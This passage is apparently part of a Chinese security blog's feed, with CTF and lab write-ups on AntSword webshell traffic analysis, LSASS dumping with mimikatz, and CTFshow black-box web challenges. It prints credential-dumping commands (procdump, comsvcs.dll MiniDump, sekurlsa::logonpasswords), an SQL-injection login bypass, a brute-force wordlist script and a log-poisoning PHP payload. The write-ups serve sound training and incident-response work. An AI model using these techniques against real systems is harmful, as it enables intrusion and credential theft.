src="https://oss.waynejoons.icu/picphoto/20250804204959776.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;c0ee2ad2d8.ipv6.xxx.eu.org.&#125;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>momo安全：<a href="https://mp.weixin.qq.com/s/rhPT5H0IZ4nm6JcgacRg8Q">https://mp.weixin.qq.com/s/rhPT5H0IZ4nm6JcgacRg8Q</a></p>]]></content>
    
    
    <summary type="html">玄机靶场哥斯拉4.0流量分析详解</summary>
    
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="玄机靶场" scheme="https://waynejoon.github.io/tags/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>玄机靶场 | 流量特征分析-蚂蚁爱上树</title>
    <link href="https://waynejoon.github.io/posts/Xuanji-CTF-AntSword-and-Mimikatz/"/>
    <id>https://waynejoon.github.io/posts/Xuanji-CTF-AntSword-and-Mimikatz/</id>
    <published>2025-07-31T14:29:18.000Z</published>
    <updated>2025-07-31T14:31:00.214Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>玄机靶场日常刷题训练，刚好重温一下蚁剑流量分析和mimikatz用法</p><h2 id="知识准备"><a href="#知识准备" class="headerlink" title="知识准备"></a>知识准备</h2><h3 id="蚁剑流量特征"><a href="#蚁剑流量特征" class="headerlink" title="蚁剑流量特征"></a>蚁剑流量特征</h3><p>每个请求体通常以<code>@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);</code>开头</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730181924464.png"></p><p>请求体包含<strong>base64编码</strong>内容</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730182041300.png"></p><p>响应包一般是明文，但也可能存在加密情况，结果通常为<strong>随机字符和返回结果</strong></p><p><img src="https://oss.waynejoons.icu/picphoto/20250730182310332.png"></p><p><strong>Content-Type</strong>通常为 <code>application/x-www-form-urlencoded</code>，表明数据是以标准表单形式编码的</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730182726797.png"></p><h3 id="mimikatz简单用法"><a href="#mimikatz简单用法" class="headerlink" title="mimikatz简单用法"></a>mimikatz简单用法</h3><p><strong>先用procdump抓取lsass转储文件</strong></p><ol><li>获取lsass进程id</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc | findstr lsass.exe</span><br></pre></td></tr></table></figure><ol start="2"><li>抓取 <code>lsass.dmp</code> 文件</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma &lt;LSASS_PID&gt; lsass.dmp</span><br></pre></td></tr></table></figure><p><strong>然后mimikatz解密lsass.dmp文件</strong></p><ol><li>特权提升</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br></pre></td></tr></table></figure><ol start="2"><li>加载dmp文件</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # sekurlsa::minidump lsass.dmp</span><br></pre></td></tr></table></figure><ol start="3"><li>凭据提取，导出其中的明文密码</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p><img src="https://oss.waynejoons.icu/picphoto/20250731213448489.png"></p><h2 id="玄机题目"><a href="#玄机题目" class="headerlink" title="玄机题目"></a>玄机题目</h2><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤#1"></a>步骤#1</h3><p><strong>管理员Admin账号的密码是什么？</strong></p><p>首先通过语法筛选出http流量并过滤掉404状态码的流量包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http and !(http.response.code == 404)</span><br></pre></td></tr></table></figure><p>然后快速分析一遍流量，发现product2.php有问题</p><p><img src="https://oss.waynejoons.icu/picphoto/20250731200431030.png"></p><p>这里涉及到一句话木马，可以确定这个就是webshell文件，然后解码请求包的base64内容</p><p><img src="https://oss.waynejoons.icu/picphoto/20250731200641658.png"></p><p>左下解码处选择<strong>Base64</strong>，可以看到解码后的内容符合蚁剑特征，因此确定这是以蚁剑为媒介的一次攻击行为</p><p><img src="https://oss.waynejoons.icu/picphoto/20250731200913454.png"></p><p>因为蚁剑与网站是通过POST方法进行通信的，所以我们重新改进一下筛选语法，直接筛选出方法为POST且包含文件名product2.php的流量，可以缩小分析范围</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method == POST and http.request.uri contains &quot;product2.php&quot;</span><br></pre></td></tr></table></figure><p>逐个分析流量，<strong>解码base64数据</strong>，因为蚁剑的特性，前两位是随机值，所以<strong>开始位置调整为2</strong>，最后发现<strong>No.15190数据包</strong>有问题</p><p><img src="https://oss.waynejoons.icu/picphoto/20250731202612885.png"></p><p>执行了系统命令<code>net user admin Password1 /add</code>，也就是添加一个名为admin的用户，然后密码设置为Password1，但是此时该用户并不是管理员，分析下一个数据包，可以看到</p><p><img src="https://oss.waynejoons.icu/picphoto/20250731203210396.png"></p><p>攻击者将admin用户添加进本地管理员组，从此刻起该用户admin才具有管理员权限</p><p>因此答案就是这个用户的密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Password1&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤#2"></a>步骤#2</h3><p><strong>LSASS.exe的程序进程ID是多少？</strong></p><p>继续分析流量，发现<strong>No.4069数据包</strong>有问题</p><p><img src="https://oss.waynejoons.icu/picphoto/20250731210814888.png"></p><p>可以看到攻击者执行了命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe comsvcs.dll, MiniDump 852 C:\Temp\OnlineShopBackup.zip full</span><br></pre></td></tr></table></figure><p>我们分析一下</p><ul><li><p><strong>rundll32.exe</strong>: 这是一个 Windows 系统程序，用于运行 DLL（动态链接库）文件中的函数。它本身不执行任何操作，而是作为调用 DLL 函数的宿主</p></li><li><p><strong>comsvcs.dll</strong>: 这是一个系统 DLL 文件，包含了 COM+ 服务相关的函数。在这个命令中，它被用来调用其内部的 <code>MiniDump</code> 函数</p></li><li><p><strong>MiniDump</strong>: 这是 <code>comsvcs.dll</code> 中的一个函数，用于创建指定进程的内存转储。内存转储是进程在某个时间点的内存快照，通常用于调试或故障排除</p></li><li><p><strong>852</strong>: 这是要进行内存转储的进程的 <strong>PID（进程 ID）</strong></p></li><li><p><strong>C:\Temp\OnlineShopBackup.zip</strong>: 这是内存转储文件的输出路径和文件名。尽管文件名是 <code>.zip</code>，但它实际上是一个原始的内存转储文件，并不是一个压缩文件</p></li><li><p><strong>full</strong>: 这是一个参数，指定了内存转储的类型。表示创建一个完整的内存转储，包含进程的所有内存信息。其他参数还包括 <code>mini</code> (较小的转储) 或 <code>heap</code> (只包含堆信息) 等</p></li></ul><p>简而言之，这条命令就是先找到 PID 为 <strong>852</strong> 的进程，然后创建一个该进程的<strong>完整内存快照</strong>，并将这个内存快照保存到<code>C:\Temp\OnlineShopBackup.zip</code>文件中</p><p>因此LSASS.exe的程序进程ID就是852</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;852&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-3"><a href="#步骤-3" class="headerlink" title="步骤#3"></a>步骤#3</h3><p><strong>用户WIN101的密码是什么?</strong></p><p>要获取用户WIN101的密码，需要我们把前面提到的<strong>完整内存快照</strong>下载下来，也就是<strong>OnlineShopBackup.zip</strong>，然后用<strong>mimikatz</strong>分析</p><p>因此我们需要导出http对象</p><p><img src="https://oss.waynejoons.icu/picphoto/20250731212240680.png"></p><p>文本过滤器输入product2.php，缩小对象范围，同时按照大小降序来排列，因为dmp文件比较大</p><p><img src="https://oss.waynejoons.icu/picphoto/20250731212726860.png"></p><p>可以看到第一个文件大小为47MB，就是我们要找的dmp文件，导出到桌面，用010editor打开验证</p><p><img src="https://oss.waynejoons.icu/picphoto/20250731213829620.png"></p><p>开头显示MDMP，可以确定是dmp文件，但是前面多了<strong>e1c1709</strong>这几个字符，直接放入mimikatz解密会报错，因此需要先删掉，然后将文件后缀改为dmp，放到跟mimikatz同一个目录</p><p><img src="https://oss.waynejoons.icu/picphoto/20250731215021947.png"></p><p>记得mimikatz<strong>以管理员身份运行</strong></p><p>运行命令获取系统密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump product2.dmp</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>然后找到用户名为win101的NTLM哈希值</p><p><img src="https://oss.waynejoons.icu/picphoto/20250731215249596.png"></p><p>得到哈希值为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">282d975e35846022476068ab5a3d72df</span><br></pre></td></tr></table></figure><p>对NTLM的md5解密即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250731215538646.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;admin#123&#125;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>momo安全：<a href="https://mp.weixin.qq.com/s/KgkilGEUmle5P_KvzAjDmw">https://mp.weixin.qq.com/s/KgkilGEUmle5P_KvzAjDmw</a></p>]]></content>
    
    
    <summary type="html">流量特征分析-蚂蚁爱上树详细题解</summary>
    
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="玄机靶场" scheme="https://waynejoon.github.io/tags/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>玄机靶场 | 蚁剑流量分析</title>
    <link href="https://waynejoon.github.io/posts/Xuanji-CTF-AntSword-Traffic-Analysis/"/>
    <id>https://waynejoon.github.io/posts/Xuanji-CTF-AntSword-Traffic-Analysis/</id>
    <published>2025-07-30T13:57:39.000Z</published>
    <updated>2025-07-30T14:37:56.079Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是蚁剑"><a href="#什么是蚁剑" class="headerlink" title="什么是蚁剑"></a>什么是蚁剑</h2><p>蚁剑（AntSword）是一款开源的网络安全工具，它主要面向于合法授权的渗透测试安全人员以及进行常规操作的网站管理员，常用于网络渗透测试，可以远程连接被攻击的计算机，进行文件上传下载、执行系统命令等操作</p><p>蚁剑下载地址：<a href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></p><h2 id="蚁剑流量特征"><a href="#蚁剑流量特征" class="headerlink" title="蚁剑流量特征"></a>蚁剑流量特征</h2><p>每个请求体通常以<code>@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);</code>开头</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730181924464.png"></p><p>请求体包含<strong>base64编码</strong>内容</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730182041300.png"></p><p>响应包一般是明文，但也可能存在加密情况，结果通常为<strong>随机字符和返回结果</strong></p><p><img src="https://oss.waynejoons.icu/picphoto/20250730182310332.png"></p><p><strong>Content-Type</strong>通常为 <code>application/x-www-form-urlencoded</code>，表明数据是以标准表单形式编码的</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730182726797.png"></p><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p><img src="https://oss.waynejoons.icu/picphoto/20250730181626135.png"></p><h2 id="玄机题目"><a href="#玄机题目" class="headerlink" title="玄机题目"></a>玄机题目</h2><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤#1"></a>步骤#1</h3><p><strong>木马的连接密码是多少</strong></p><p>首先输入http筛选出http协议流量包，这些内容就是我们要分析的流量了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730182915270.png"></p><p>随便点开一个请求的内容，例如第一个请求包，观察发包内容</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730183101974.png"></p><p>这里面的key就是木马的连接密码，为“1”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤#2"></a>步骤#2</h3><p><strong>黑客执行的第一个命令是什么</strong></p><p>点开第一个流量包，查看请求内容，选择最后一个item的value值，点击“显示分组字节流”</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730183629715.png"></p><p>因为是base64编码，因此需要在左下<strong>选择Base64解码</strong>，由于蚁剑的特征，前两位是随机值，所以<strong>开始位置调整为“2”</strong>，成功得到执行命令</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730183900592.png"></p><p>结合响应内容可知，第一个执行的命令为<strong>id</strong>，为什么不是<code>cd &quot;/var/www/html&quot;</code>呢，因为这是蚁剑自动执行的，表示攻击者是在&#x2F;var&#x2F;www&#x2F;html执行命令的</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730185813544.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;id&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-3"><a href="#步骤-3" class="headerlink" title="步骤#3"></a>步骤#3</h3><p><strong>黑客读取了哪个文件的内容，提交文件绝对路径</strong></p><p>分析到第三个响应包时，发现返回内容为&#x2F;etc&#x2F;passwd</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730190334812.png"></p><p>查看第三个请求包，方法跟步骤2一样，也是点开“显示分组字节流”，调整开始位置为“2”，解码为“Base64”，可以看到执行了命令<code>cat /etc/passwd</code>，因此答案就是这个</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730190447902.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;/etc/passwd&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-4"><a href="#步骤-4" class="headerlink" title="步骤#4"></a>步骤#4</h3><p><strong>黑客上传了什么文件到服务器，提交文件名</strong></p><p>分析到第四个响应包时，发现返回内容很短，跟其他流量包的内容差距较大，可以猜测出这是文件上传后的响应内容</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730190910833.png"></p><p>跟之前一样，我们看看第四个请求包内容，解码可以得到上传的文件名</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730191252838.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;flag.txt&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-5"><a href="#步骤-5" class="headerlink" title="步骤#5"></a>步骤#5</h3><p><strong>黑客上传的文件内容是什么</strong></p><p>分析第四个请求包，可以发现编码内容跟其他流量包有较大差距，由于蚁剑上传的文件会对内容进行16进制编码，因此我们对其进行解码查看</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730192302335.png"></p><p>解码选择“Hex Digits”，其他不用变，成功得到文件内容</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730192421756.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;write_flag&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-6"><a href="#步骤-6" class="headerlink" title="步骤#6"></a>步骤#6</h3><p><strong>黑客下载了哪个文件，提交文件绝对路径</strong></p><p>分析第六个响应包，可以看到这是一个文件的返回内容</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730195107359.png"></p><p>通过分析，这六个HTTP事务（一次完整的请求+响应）里面，前三个是执行系统命令的，后三个则是执行文件上传下载浏览操作的</p><p>其中第四个我们已经证实是文件上传，那第五个是什么呢？通过对请求包进行解码，得到内容是&#x2F;var&#x2F;www&#x2F;html&#x2F;7，这是蚁剑自动执行的，实际上攻击者应该是点开了蚁剑的<strong>文件管理</strong>功能，然后回显为</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730195547252.png"></p><p>显示的是<code>/var/www/html</code>里面的内容，因此第五个事务并不是下载文件，而是浏览目录</p><p>最后看第六个请求包的内容，步骤跟之前一样，得到</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730200530897.png"></p><p>结合前面的返回内容，因此第六个请求包反应的就是黑客下载的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;/var/www/html/config.php&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.前三个事务反应的是执行系统命令，后三个事务反应的是文件上传下载浏览等操作，通过对前三个请求包解码可以看到</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730204205964.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250730204309938.png"></p><p><code>/bin/sh</code> 是指向系统标准shell的路径，用于进行交互，也就是执行系统命令，而后三个事务没有</p><p>2.攻击者的完整行为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.攻击者首先通过蚁剑连接webshell，文件名为1.php，连接密码为1，连接URL为http://192.168.200.54/1.php</span><br><span class="line">2.连接后双击打开了/var/www/html目录，点开虚拟终端，执行命令id和pwd</span><br><span class="line">3.接着执行ls和pwd，查看当前目录文件和所在目录</span><br><span class="line">4.执行cat /etc/passwd和pwd，查看/etc/passwd内容和当前目录</span><br><span class="line">5.上传文件flag.txt到/var/www/html，内容为flag&#123;write_flag&#125;</span><br><span class="line">6.攻击者点开文件管理功能查看/var/www/html目录</span><br><span class="line">7.在文件管理功能处攻击者下载了/var/www/html/config.php，获得网站配置文件</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250730210321419.png"></p><p>通过查看config.php文件，攻击者获得了目标网站数据库的敏感信息等</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>网安日记本：<a href="https://blog.csdn.net/haosha__demingzi/article/details/135816411">https://blog.csdn.net/haosha__demingzi/article/details/135816411</a></p>]]></content>
    
    
    <summary type="html">蚁剑流量分析详细题解</summary>
    
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="玄机靶场" scheme="https://waynejoon.github.io/tags/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>CTFSHOW | 黑盒测试 web380 - web395</title>
    <link href="https://waynejoon.github.io/posts/ctfshow-black-box-web380-web395/"/>
    <id>https://waynejoon.github.io/posts/ctfshow-black-box-web380-web395/</id>
    <published>2025-07-27T12:21:23.000Z</published>
    <updated>2025-07-27T12:22:25.874Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是黑盒测试"><a href="#什么是黑盒测试" class="headerlink" title="什么是黑盒测试"></a>什么是黑盒测试</h2><p>黑盒测试（Black-Box Testing）是一种软件测试方法，测试人员在<strong>完全不了解程序内部结构和源代码</strong>的情况下，对程序的功能进行测试。测试人员就像普通用户一样，只能通过程序的输入（如点击链接、在输入框中填写数据）来观察其输出，以此判断程序是否存在问题</p><h2 id="黑盒测试一般思路"><a href="#黑盒测试一般思路" class="headerlink" title="黑盒测试一般思路"></a>黑盒测试一般思路</h2><p>在进行黑盒测试时，通常会遵循一个系统性的流程，大致可以分为以下几个关键步骤：</p><p><strong>1. 信息收集 (Reconnaissance)</strong></p><p>这是所有测试的第一步，目的是尽可能多地了解目标，发现所有可能的攻击入口</p><ul><li><strong>目录&#x2F;文件扫描</strong>：使用工具扫描网站可能存在的隐藏目录和文件，如后台登录页面、功能性文件、源码备份等。</li><li><strong>前端代码分析</strong>：查看网页的HTML、CSS和JavaScript源码（浏览器F12或Ctrl+U），从中寻找隐藏的路径、注释、API接口等。</li><li><strong>技术栈识别</strong>：通过HTTP响应头、错误信息、网页页脚等判断网站使用的技术（如Apache、Nginx等），有助于我们选择更具针对性的测试方法。</li></ul><p><strong>2. 漏洞发现 (Vulnerability Analysis)</strong></p><p>收集到足够的信息后，就可以对发现的各个功能点和入口点进行漏洞测试</p><ul><li><strong>输入点测试</strong>：对所有用户可以输入数据的地方（如URL参数、搜索框、登录框）进行测试，寻找SQL注入、文件包含、命令执行等漏洞。</li><li><strong>认证与授权测试</strong>：测试登录认证机制是否可以被绕过或破解，例如使用万能密码、暴力破解、伪造JWT等。</li><li><strong>逻辑测试</strong>：测试应用程序的业务逻辑是否存在缺陷，例如密码重置功能是否可以被滥用、支付流程是否可以被绕过等。</li></ul><p><strong>3. 漏洞利用 (Exploitation)</strong></p><p>在确认漏洞存在后，构造特定的Payload来利用这个漏洞，以达到我们的最终目的。在CTF中，这个目的通常是读取服务器上的<code>flag</code>文件。在真实的渗透测试中，目的可能是获取服务器的控制权或窃取敏感数据等</p><h2 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h2><h3 id="web380"><a href="#web380" class="headerlink" title="web380"></a>web380</h3><p>扫描网站目录，发现存在两个文件路径</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725142224269.png"></p><p>其中第一个大小为0B，可以不用管，直接看第二个路径<code>/page.php</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250725142333053.png"></p><p>显示打开$id.php失败，我们尝试能不能控制这个参数，输入<code>/page.php?id=1</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250725142607470.png"></p><p>发现存在文件包含漏洞，直接输入<code>/page.php?id=flag</code>，查看源码得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725142727324.png"></p><h3 id="web381"><a href="#web381" class="headerlink" title="web381"></a>web381</h3><p>打开网站，查看网页源代码，发现相比上一题，这里多了个可疑路径</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725153243865.png"></p><p>为了更直观地看到区别，这里把上一题的网页源码放出来</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725153615340.png"></p><p>我们访问路径<code>/alsckdfy</code>，成功得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725153359744.png"></p><h3 id="web382"><a href="#web382" class="headerlink" title="web382"></a>web382</h3><p>打开网站，查看网页源代码，跟上一题一样</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725153243865.png"></p><p>继续访问路径<code>/alsckdfy</code>，这次打开了一个登录框</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725154508006.png"></p><p>尝试用万能密码，成功登录，账号<code>1&#39; or 1=1 #</code>，密码随便写，成功得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725154640903.png"></p><h3 id="web383"><a href="#web383" class="headerlink" title="web383"></a>web383</h3><p>跟上题步骤一样，也是先访问路径<code>/alsckdfy</code>，打开登录框后输入万能密码得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725155034524.png"></p><h3 id="web384"><a href="#web384" class="headerlink" title="web384"></a>web384</h3><p>跟之前一样，来到登录框这里，这次题目有提示，告诉我们密码前2位是小写字母，后三位是数字，很明显是要爆破</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725155312098.png"></p><p>因此我们抓取登录的包来尝试爆破，账号用admin，密码可以根据题目要求生成一个字典，python脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;passwd.txt&quot;</span></span><br><span class="line"></span><br><span class="line">letters = string.ascii_lowercase  <span class="comment"># 小写字母 &#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">digits = string.digits          <span class="comment"># 数字 &#x27;0123456789&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> letter_pair <span class="keyword">in</span> itertools.product(letters, repeat=<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> digit_triplet <span class="keyword">in</span> itertools.product(digits, repeat=<span class="number">3</span>):</span><br><span class="line">            password = <span class="string">&quot;&quot;</span>.join(letter_pair) + <span class="string">&quot;&quot;</span>.join(digit_triplet)</span><br><span class="line">            f.write(password + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;密码字典生成完毕，已保存到 <span class="subst">&#123;filename&#125;</span> 文件中。&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后插入到密码处爆破即可，我这里用的yakit，如果是burpsuite同理</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725162849055.png"></p><p>最后爆破出来密码是<code>xy123</code>，成功得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725163117700.png"></p><h3 id="web385"><a href="#web385" class="headerlink" title="web385"></a>web385</h3><p>跟之前一样，来到登录框这里，但是这次万能密码不行，题目也没有提示，先尝试扫目录看看</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725163904498.png"></p><p>发现有个路径<code>/install</code>，拼接进网站访问看看</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725164018869.png"></p><p>然后访问<code>/install/?install</code>，发现成功将管理员密码重置为默认密码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725164202807.png"></p><p>因为不知道默认密码，因此我们尝试进行弱口令爆破</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725165047725.png"></p><p>爆破得到密码为<strong>admin888</strong>，成功得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725164546007.png"></p><h3 id="web386"><a href="#web386" class="headerlink" title="web386"></a>web386</h3><p>扫描目录</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725171214575.png"></p><p>访问<code>/install</code>，但是这次显示lock.dat存在</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725171253540.png"></p><p>这题相比上一题多了一个<code>/clear.php</code>，访问显示清理完成，我们尝试能不能控制它清理我们指定的文件，猜测参数可能为file，访问<code>/clear.php?file=install/lock.dat</code>，接着再次访问<code>/install</code>，发现lock.dat成功被删除</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725171808129.png"></p><p>这时再访问<code>/install/?install</code>重置密码即可，其他步骤跟上题一样，密码依然是<strong>admin888</strong>，成功得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725171905118.png"></p><h3 id="web387"><a href="#web387" class="headerlink" title="web387"></a>web387</h3><p>扫描目录</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725172615509.png"></p><p>发现多了个<code>/debug</code>，访问看看</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725172708216.png"></p><p>显示<strong>file not exist</strong>，猜测可以进行文件包含，输入<code>/debug/?file=/etc/passwd</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250725172828155.png"></p><p>成功读取到文件，尝试进行日志包含执行命令，<strong>UA</strong>写入如下内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;/var/www/html/install/lock.dat&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250725174131199.png"></p><p>再次访问<code>/install</code>，发现成功删除lock.dat</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725174241686.png"></p><p>其他步骤跟之前一样，密码依然是<strong>admin888</strong>，成功得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725174444249.png"></p><h3 id="web388"><a href="#web388" 